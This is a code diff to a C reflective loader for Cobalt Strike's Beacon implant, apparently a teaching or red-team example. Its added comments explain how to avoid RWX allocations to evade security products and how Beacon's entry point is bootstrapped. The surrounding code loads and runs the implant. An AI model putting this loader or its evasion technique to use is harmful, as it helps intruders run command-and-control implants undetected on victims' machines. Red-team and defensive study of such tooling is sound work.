@@ -2,6 +2,7 @@
 #include "loader.h"
 #include "tcg.h"
 #include "memory.h"
+#include <intrin.h>
 
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
@@ -71,7 +72,16 @@ void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, MEMORY_REG
 
 void go ( void * loader_arguments )
 {
-    /* populate funcs */
+    /*
+    Two functions provided via tcg.h - PicoLoad and ProcessImports - require access to the 
+    LoadLibraryA and GetProcAddress APIs to function.  These are needed to ensure any modules
+    that a PICO or DLL are dependant on are properly imported and resolved.
+    This is potentially quite confusing because there are no DFR references for these two APIs.
+    This is purely a 'convenience' thing provided by Crystal Palace, as it will implicitly assume
+    that LoadLibraryA and GetProcAddress mean KERNEL32$LoadLibraryA and KERNEL32$GetProcAddress
+    respectively.
+    */
+
     IMPORTFUNCS funcs;
     funcs.LoadLibraryA   = LoadLibraryA;
     funcs.GetProcAddress = GetProcAddress;
@@ -80,6 +90,15 @@ void go ( void * loader_arguments )
     char * pico_src = GETRESOURCE ( _PICO_ );
 
     /* allocate memory for it */
+    /*
+    The basic loader allocates a single RWX memory region for Beacon, which is not good OPSEC.
+    Lots of security products will alert on RWX memory allocations, unless they're in expected 
+    processes like PowerShell.
+    Instead, we would like to allocate RW memory and then change the permissions based on the 
+    characteristics of each DLL section.
+    Load the DLL as normal but call fix_section_permissions after the DLL's imports have been 
+    processed.
+    */
     PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
     /* load it into memory */
@@ -88,17 +107,20 @@ void go ( void * loader_arguments )
     /* make code section RX */
     DWORD old_protect;
     KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
-    
+
     /* begin tracking memory allocations */
     MEMORY_LAYOUT memory    = { 0 };
 
     memory.Pico.BaseAddress = ( PVOID ) ( pico_dst );
     memory.Pico.Size        = sizeof ( PICO );
     
+    /* section 0 is data section */
     memory.Pico.Sections[ 0 ].BaseAddress     = ( PVOID ) ( pico_dst->data );
     memory.Pico.Sections[ 0 ].Size            = PicoDataSize ( pico_src );
     memory.Pico.Sections[ 0 ].CurrentProtect  = PAGE_READWRITE;
     memory.Pico.Sections[ 0 ].PreviousProtect = PAGE_READWRITE;
+    
+    /* section 1 is code section */
     memory.Pico.Sections[ 1 ].BaseAddress     = ( PVOID ) ( pico_dst->code );
     memory.Pico.Sections[ 1 ].Size            = PicoCodeSize ( pico_src );
     memory.Pico.Sections[ 1 ].CurrentProtect  = PAGE_EXECUTE_READ;
@@ -134,6 +156,8 @@ void go ( void * loader_arguments )
 
     /* call setup_memory to give PICO the memory info */
     ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_memory ( ) ) ) ( &memory );
+    
+    // __debugbreak();
 
     /* now run the DLL */
     DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );
@@ -141,6 +165,15 @@ void go ( void * loader_arguments )
     /* free the unmasked copy */
     KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );
 
+    /*
+    Beacon (and its postex DLLs) have a calling convention where their entry point needs to be
+    called multiple times so they can bootstrap themselves prior to execution.
+    You call it the first time using a fdwReason value of 1 (DLL_PROCESS_ATTACH), while passing 
+    the DLL's own base address; then call it a second time using a fdwReason of 4, while passing
+    the base address of the loader.
+    This last one is needed so that if stage.cleanup (or post-ex.cleanup) are set to true, 
+    the DLL can free the loader from memory.    
+    */
     entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
     entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, loader_arguments );
 }
